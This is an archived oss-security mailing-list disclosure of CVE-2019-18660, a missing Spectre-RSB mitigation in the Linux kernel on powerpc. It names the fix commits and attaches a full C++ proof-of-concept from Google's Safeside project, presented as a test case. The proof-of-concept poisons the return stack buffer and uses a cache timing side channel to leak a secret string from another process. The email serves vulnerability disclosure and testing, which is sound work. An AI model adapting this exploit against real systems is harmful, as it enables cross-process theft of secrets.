X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["17727" "Thursday" "28" "November" "2019" "07:37:42" "+1100" "Michael Ellerman" "mpe@ellerman.id.au" nil "503" nil "^Date:" nil nil "11" nil nil (number mark "        mpe@ellerman Nov 28  503/17727 " thread-indent "\"[oss-security] CVE-2019-18660: Linux kernel: powerpc: missing Spectre-RSB mitigation\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2019-18660: Linux kernel: powerpc: missing Spectre-RSB mitigation" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 9960 invoked by uid 550); 27 Nov 2019 21:20:53 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 29793 invoked from network); 27 Nov 2019 20:37:57 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=ellerman.id.au;
	s=201909; t=1574887065;
	bh=MmZsm0NGfZMotssX0bPSfI4susTTpIkIbIsk0NrpJos=;
	h=From:To:Subject:Date:From;
	b=WF+I918ncLwxA7kff7CpQBjBOUKP+ukm7EdW+6n7UVUijMC2N3YDo4id5Z34QFf7U
	 yVbgqRibf2OEK9XgNwUSMaCOtUeji+WJjYjzG4JK+VzdvgBWQk+YwZi5DdV/EknZ3Y
	 y6WnrZYq++rWcor7fYayvKfYxqzPPFs5t4xBtBeNH7Be5ZQLT+J973u8hbTxEfim//
	 4kGNKgdvCjnGgtLCh2NG6fJu/wtD1dXS8TPoTjBbsDlXoSmvVcswbllsHgCNa+HnLE
	 i/DXFAl11DPDZ5ygU5ozshSMQjz9ofsc3TB5FWr7yOfusIn8Mo14gb9diujmL4qWtx
	 kZpAMC7sQc4bg==
Message-ID: <87h82p12eh.fsf@mpe.ellerman.id.au>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="=-=-="
Date: Thu, 28 Nov 2019 07:37:42 +1100
From: Michael Ellerman <mpe@ellerman.id.au>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] CVE-2019-18660: Linux kernel: powerpc: missing Spectre-RSB mitigation
To: oss-security@lists.openwall.com

--=-=-=
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable

The Linux kernel for powerpc fails to activate the mitigation for Spectre-R=
SB
(Return Stack Buffer, aka. ret2spec) on context switch, on CPUs prior to Po=
wer9
DD2.3.

This allows a process to poison the RSB (called Link Stack on Power CPUs) a=
nd
possibly misdirect speculative execution of another process. If the victim
process can be induced to execute a leak gadget then it may be possible to
extract information from the victim via a side channel.

Mitigation for Spectre-RSB was introduced in commit:
  ee13cb249fab (=E2=80=9Cpowerpc/64s: Add support for software count cache =
flush=E2=80=9D)

Which was originally merged in v4.19.

However that commit incorrectly tied the code to flush the link stack to a
firmware feature which is only enabled on newer CPUs (P9N DD2.3 or later), =
when
it should have been applied to all CPUs that are affected by Spectre v2.

The fix is to enable the link stack flush on all CPUs that have any mitigat=
ion
of Spectre v2 in userspace enabled.

This issue is assigned CVE-2019-18660.

CVSS 3.1 Score: 5.6
AV:L/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N

This issue was discovered by Anthony Steinhauser of Google's Safeside Proje=
ct.

Additionally we have determined that when returning from a guest, there is =
the
possibility that poisoned values on the link stack could be used by function
returns in the host kernel. To mitigate this we have added a flush of the l=
ink
stack in the guest exit path.

The fix is in mainline as:
  https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit=
/?id=3D39e72bf96f5847ba87cc5bd7a3ce0fed813dc9ad

And the KVM fix is:
  https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit=
/?id=3Daf2e8c68b9c5403f77096969c516f742f5bb29e0

Both will be released in v5.5-rc1.

There's a test case attached, extracted from Google's safeside project. It =
can
be built with:
  $ g++ -O2 -Wall -std=3Dc++11 -m64 -o ret2spec_recursion_ca ret2spec_recur=
sion_ca.cc

Output on an unpatched system:
  $ ./ret2spec_recursion_ca
  Leaking the string: It's a s3kr3t!!!
  16 bytes successfully leaked
  FAIL! Was able to leak the secret

vs patched:
  $ ./ret2spec_recursion_ca
  Leaking the string: ????????????????
  0 bytes successfully leaked
  PASS! Unable to leak the secret

cheers


--=-=-=
Content-Type: text/plain
Content-Disposition: attachment; filename=ret2spec_recursion_ca.cc

/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * Demonstration of ret2spec that exploits the fact that return stack buffers
 * have limited size and they can be rewritten by recursive invocations of
 * another function by another process.
 *
 * We have two functions that we named after their constant return values. One
 * process (the attacker) calls recursively the ReturnsFalse function and yields
 * the CPU in the deepest invocation. This way it leaves the RSB full of return
 * addresses to the ReturnsFalse invocation that are absolutely unreachable from
 * the victim process.
 *
 * The victim process invokes recursively the ReturnTrue function, but before
 * each return it flushes from cache the stack frame that contains the return
 * address. The prediction uses the polluted RSB with return addresses injected
 * by the attacker and the victim jumps to architecturally unreachable code that
 * has microarchitectural side-effects.
 **/

#include <array>
#include <cstring>
#include <iostream>
#include <vector>

#include <sys/types.h>
#include <unistd.h>



// From Google's instr.h/cc

#include <cstdint>

// Architecturally dependent full memory fence.
static void MFence() {
	asm volatile("sync");
}

// Forces a memory read of the byte at address p. This will result in the byte
// being loaded into cache.
void ForceRead(const void *p) {
	(void)*reinterpret_cast<const volatile char *>(p);
}

// Architecturally dependent cache flush.
void CLFlush(const void *memory) {
	asm volatile("dcbf 0, %0" ::"r"(memory) : "memory");
	MFence();
}

// Memory read latency measurement.
uint64_t ReadLatency(const void *memory) {
	uint64_t start, end, tmp;
	asm volatile("mftb	%[start]			\n"
		     "xor	%[tmp],    %[start],  %[start]	\n"
		     "add	%[memory], %[memory], %[tmp]	\n"
		     "lbz	%[tmp],    0(%[memory])		\n"
		     "mftb	%[end]				\n"
		     : [start] "=&r" (start), [tmp] "=&r" (tmp), [end] "=&r" (end)
		     : [memory] "r" (memory)
		     : "memory");
	return end - start;
}

// end instr.h

// From Google's cache_sidechannel.h/cc

#include <array>
#include <memory>
#include <list>

// Represents a cache-line in the oracle for each possible ASCII code.
// We can use this for a timing attack: if the CPU has loaded a given cache
// line, and the cache line it loaded was determined by secret data, we can
// figure out the secret byte by identifying which cache line was loaded.
// That can be done via a timing analysis.
//
// To do this, we create an array of 256 values, each of which do not share
// the same cache line as any other. To eliminate false positives due
// to prefetching, we also ensure no two values share the same page,
// by spacing them at intervals of 4096 bytes.
//
// See 2.3.5.4 Data Prefetching in the Intel Optimization Reference Manual:
//   "Data prefetching is triggered by load operations when [...]
//    The prefetched data is within the same 4K byte page as the load
//    instruction that triggered it."
//
// ARM also has this constraint on prefetching:
//   http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ddi0388i/CBBIAAAA.html
//
// Spacing of 4096 was used in the original Spectre paper as well:
//   https://spectreattack.com/spectre.pdf
//
struct BigByte {
  // Explicitly initialize the array. It doesn't matter what we write; it's
  // only important that we write *something* to each page. Otherwise,
  // there's an opportunity for the range to be allocated as zero-fill-on-
  // demand (ZFOD), where all virtual pages are a read-only mapping to the
  // *same* physical page of zeros. The cache in modern Intel CPUs is
  // physically-tagged, so all of those virtual addresses would map to the
  // same cache line and we wouldn't be able to observe a timing difference
  // between accessed and unaccessed pages (modulo e.g. TLB lookups).
  std::array<unsigned char, 4096> padding_ = {};
};

// The first and last value might be adjacent to other elements on the heap,
// so we only add padding from both side and use only the other elements, which
// are guaranteed to be on different cache lines, and even different pages,
// than any other value.
struct PaddedOracleArray {
  BigByte pad_left;
  std::array<BigByte, 256> oracles_;
  BigByte pad_right;
};

// Provides an oracle of allocated memory indexed by 256 character ASCII
// codes in order to capture speculative cache loads.
//
// The client is expected to flush the oracle from the cache and access one of
// the indexing characters really (safe_offset_char) and one of them
// speculatively.
//
// Afterwards the client invokes the recomputation of the scores which
// computes which character was accessied speculatively and increases its
// score.
//
// This process (flushing oracle, speculative access of the oracle by the
// client and recomputation of scores) repeats until one of the characters
// accumulates a high enough score.
//
class CacheSideChannel {
 public:
  CacheSideChannel() = default;

  // Not copyable or movable.
  CacheSideChannel(const CacheSideChannel&) = delete;
  CacheSideChannel& operator=(const CacheSideChannel&) = delete;

  // Provides the oracle for speculative memory accesses.
  const std::array<BigByte, 256> &GetOracle() const;
  // Flushes all indexes in the oracle from the cache.
  void FlushOracle() const;
  // Finds which character was accessed speculatively and increases its score.
  // If one of the characters got a high enough score, returns true and that
  // character. Otherwise it returns false and any character that has the
  // highest score.
  std::pair<bool, char> RecomputeScores(char safe_offset_char);
  // Adds an artifical cache-hit and recompute scores. Useful for demonstration
  // that do not have natural architectural cache-hits.
  std::pair<bool, char> AddHitAndRecomputeScores();

 private:
  // Oracle array cannot be allocated for stack because MSVC stack size is 1MB,
  // so it would immediately overflow.
  std::unique_ptr<PaddedOracleArray> padded_oracle_array_ =
      std::unique_ptr<PaddedOracleArray>(new PaddedOracleArray);
  std::array<int, 256> scores_ = {};
};

// Returns the indices of the biggest and second-biggest values in the range.
template <typename RangeT>
static std::pair<size_t, size_t> top_two_indices(const RangeT &range) {
  std::pair<size_t, size_t> result = {0, 0};  // first biggest, second biggest
  for (size_t i = 0; i < range.size(); ++i) {
    if (range[i] > range[result.first]) {
      result.second = result.first;
      result.first = i;
    } else if (range[i] > range[result.second]) {
      result.second = i;
    }
  }
  return result;
}

const std::array<BigByte, 256> &CacheSideChannel::GetOracle() const {
  return padded_oracle_array_->oracles_;
}

void CacheSideChannel::FlushOracle() const {
  // Flush out entries from the timing array. Now, if they are loaded during
  // speculative execution, that will warm the cache for that entry, which
  // can be detected later via timing analysis.
  for (BigByte &b : padded_oracle_array_->oracles_) {
    CLFlush(&b);
  }
}

std::pair<bool, char> CacheSideChannel::RecomputeScores(
    char safe_offset_char) {
  std::array<uint64_t, 256> latencies = {};
  size_t best_val = 0, runner_up_val = 0;

  // Here's the timing side channel: find which char was loaded by measuring
  // latency. Indexing into isolated_oracle causes the relevant region of
  // memory to be loaded into cache, which makes it faster to load again than
  // it is to load entries that had not been accessed.
  // Only two offsets will have been accessed: safe_offset_char (which we
  // ignore), and i.
  // Note: if the character at safe_offset_char is the same as the character we
  // want to know at i, the data from this run will be useless, but later runs
  // will use a different safe_offset_char.
  for (size_t i = 0; i < 256; ++i) {
    // Some CPUs (e.g. AMD Ryzen 5 PRO 2400G) prefetch cache lines, rendering
    // them all equally fast. Therefore it is necessary to confuse them by
    // accessing the offsets in a pseudo-random order.
    size_t mixed_i = ((i * 167) + 13) & 0xFF;
    const void *timing_entry = &GetOracle()[mixed_i];
    latencies[mixed_i] = ReadLatency(timing_entry);
  }

  std::list<uint64_t> sorted_latencies_list(latencies.begin(), latencies.end());
  // We have to used the std::list::sort implementation, because invocations of
  // std::sort, std::stable_sort, std::nth_element and std::partial_sort when
  // compiled with optimizations intervene with the neural network based AMD
  // memory disambiguation dynamic predictor and the Spectre v4 example fails
  // on AMD Ryzen 5 PRO 2400G.
  sorted_latencies_list.sort();
  std::vector<uint64_t> sorted_latencies(sorted_latencies_list.begin(),
                                         sorted_latencies_list.end());
  uint64_t median_latency = sorted_latencies[128];

  // The difference between a cache-hit and cache-miss times is significantly
  // different across platforms. Therefore we must first compute its estimate
  // using the safe_offset_char which should be a cache-hit.
  uint64_t hitmiss_diff = median_latency - latencies[
      static_cast<size_t>(static_cast<unsigned char>(safe_offset_char))];

  int hitcount = 0;
  for (size_t i = 0; i < 256; ++i) {
    if (latencies[i] < median_latency - hitmiss_diff / 2 &&
        i != safe_offset_char) {
      ++hitcount;
    }
  }

  // If there is not exactly one hit, we consider that sample invalid and
  // skip it.
  if (hitcount == 1) {
    for (size_t i = 0; i < 256; ++i) {
      if (latencies[i] < median_latency - hitmiss_diff / 2 &&
          i != safe_offset_char) {
        ++scores_[i];
      }
    }
  }

  std::tie(best_val, runner_up_val) = top_two_indices(scores_);
  return std::make_pair((scores_[best_val] > 2 * scores_[runner_up_val] + 40),
                        best_val);
}

std::pair<bool, char> CacheSideChannel::AddHitAndRecomputeScores() {
  static size_t additional_offset_counter = 0;
  size_t mixed_i = ((additional_offset_counter * 167) + 13) & 0xFF;
  ForceRead(GetOracle().data() + mixed_i);
  additional_offset_counter = (additional_offset_counter + 1) % 256;
  return RecomputeScores(static_cast<char>(mixed_i));
}
// end cache_sidechannel.cc

// Memory read latency measurement.

const char *private_data = "It's a s3kr3t!!!";

// Recursion depth should be equal or greater than the RSB size, but not
// excessively high because of the possibility of stack overflow.
constexpr size_t kRecursionDepth = 64;
constexpr size_t kCacheLineSize = 128;

// Global variables used to avoid passing parameters through recursive function
// calls. Since we flush whole stack frames from the cache, it is important not
// to store on stack any data that might be affected by being flushed from
// cache.
size_t current_offset;
const std::array<BigByte, 256> *oracle_ptr;

// Return value of ReturnsFalse that never changes. Avoiding compiler
// optimizations with it.
bool false_value = false;
// Pointers to stack marks in ReturnsTrue. Used for flushing the return address
// from the cache.
std::vector<char *> stack_mark_pointers;

// Always returns false. Executed only by the child.
static bool ReturnsFalse(int counter) {
  if (counter > 0) {
    if (ReturnsFalse(counter - 1)) {
      // Unreachable code. ReturnsFalse can never return true.
      const std::array<BigByte, 256> &isolated_oracle = *oracle_ptr;
      ForceRead(isolated_oracle.data() +
                static_cast<unsigned char>(private_data[current_offset]));
      std::cout << "Dead code. Must not be printed." << std::endl;
      exit(EXIT_FAILURE);
    }
  } else {
    // Yield the CPU to increase the interference.
    sched_yield();
  }
  return false_value;
}

// Always returns true. Executed only by the attacker.
static bool ReturnsTrue(int counter) {
  // Creates a stack mark and stores it to the global vector.
  char stack_mark = 'a';
  stack_mark_pointers.push_back(&stack_mark);

  if (counter > 0) {
    // Recursively invokes itself.
    ReturnsTrue(counter - 1);
  } else {
    // Let the other process run to increase the interference.
    sched_yield();
  }

  // Cleans-up its stack mark and flushes from the cache everything between its
  // own stack mark and the next one. Somewhere there must be also the return
  // address.
  stack_mark_pointers.pop_back();
    for (int i = 0; i < (stack_mark_pointers.back() - &stack_mark);
       i += kCacheLineSize) {
    CLFlush(&stack_mark + i);
  }
  CLFlush(stack_mark_pointers.back());
  return true;
}

static char LeakByte() {
  std::pair<bool, char> result;
  CacheSideChannel sidechannel;
  oracle_ptr = &sidechannel.GetOracle();

  for (int run = 0; run <= 1000; ++run) {
    sidechannel.FlushOracle();

    // Stack mark for the first call of ReturnsTrue. Otherwise it would read
    // from an empty vector and crash.
    char stack_mark = 'a';
    stack_mark_pointers.push_back(&stack_mark);
    ReturnsTrue(kRecursionDepth);
    stack_mark_pointers.pop_back();

    result = sidechannel.AddHitAndRecomputeScores();
    if (result.first) {
      break;
    }
  }

  return result.second;
}

int main() {
  // Parent PID for the death-checking of the child.
  pid_t ppid = getpid();
  // We need both processes to run on the same core. Pinning the parent before
  // the fork to the first core. The child inherits the settings.
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(0, &set);
  int res = sched_setaffinity(getpid(), sizeof(set), &set);
  if (res != 0) {
    std::cout << "CPU affinity setup failed." << std::endl;
    exit(EXIT_FAILURE);
  }
  if (fork() == 0) {
    // The child (attacker) infinitely fills the RSB using recursive calls.
    while (true) {
      ReturnsFalse(kRecursionDepth);
      // If the parent pid changed, the parent is dead and it's time to
      // terminate.
      if (getppid() != ppid) {
        exit(EXIT_SUCCESS);
      }
    }
  } else {
    // The parent (victim) calls only LeakByte and ReturnTrue, never
    // ReturnFalse.
    std::cout << "Leaking the string: ";
    std::cout.flush();

    int bytes_leaked = 0;
    for (size_t i = 0; i < strlen(private_data); ++i) {
      current_offset = i;
      char result = LeakByte();
      if (result == private_data[i]) {
	bytes_leaked++;
      } else {
	result = '?';
      }
      std::cout << result;
      std::cout.flush();
    }
    std::cerr << std::endl << bytes_leaked <<
      " bytes successfully leaked" << std::endl;
    if (bytes_leaked) {
      std::cerr << "FAIL! Was able to leak the secret" << std::endl;
      return EXIT_FAILURE;
    } else {
      std::cerr << "PASS! Unable to leak the secret" << std::endl;
      return EXIT_SUCCESS;
    }
  }

}

--=-=-=--
